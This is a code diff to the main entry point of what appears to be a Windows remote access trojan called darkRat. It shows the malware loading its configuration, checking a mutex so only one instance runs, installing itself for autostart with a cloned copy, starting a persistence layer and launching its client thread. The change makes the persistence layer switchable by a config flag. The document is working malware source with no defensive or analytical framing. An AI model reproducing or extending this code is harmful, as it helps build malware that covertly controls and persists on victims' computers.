@@ -26,14 +26,13 @@
 #include "spiderrun.h"
 #include "Client.h"
 #include "persistenceLayer.h"
+#include <signal.h>
 
 
 #pragma comment(lib,"comsuppw.lib")
 #pragma comment( lib, "Urlmon.lib" )
 #pragma comment(lib, "netapi32.lib")
 #pragma comment(lib,"wbemuuid")
-
-
 
 
 
@@ -46,10 +45,10 @@ int WINAPI WinMain(HINSTANCE hInstance,    // HANDLE TO AN INSTANCE.  This is th
 		LPSTR szCmdLine,        // Command line arguments.  similar to argv in standard C programs
 		int iCmdShow){
 #endif
+
 		darkRat::config::config config = darkRat::config::load();
 		//Config config;
 		std::thread darkMain;
-
 
 		//Check if the Bot is Running
 		std::string mutex = "Local\\" + config.mutex;
@@ -57,7 +56,6 @@ int WINAPI WinMain(HINSTANCE hInstance,    // HANDLE TO AN INSTANCE.  This is th
 		if (GetLastError() == ERROR_ALREADY_EXISTS) // did the mutex already exist?
 			return -1; // quit; mutex is released automatically
 		
-	
 		//Autostart  (with persistence) && Clone
 		if (config.startup == "true") {
 			std::string insatlled = Helpers::installedOrnot();
@@ -67,8 +65,10 @@ int WINAPI WinMain(HINSTANCE hInstance,    // HANDLE TO AN INSTANCE.  This is th
 		}
 
 		//Run External Persistence Object
-		createLayer();
-		startLayer();
+		if (config.persistence == "true") {
+			createLayer();
+			startLayer();
+		}
 
 
 		darkMain = std::thread(Client::darkMainThread, config);
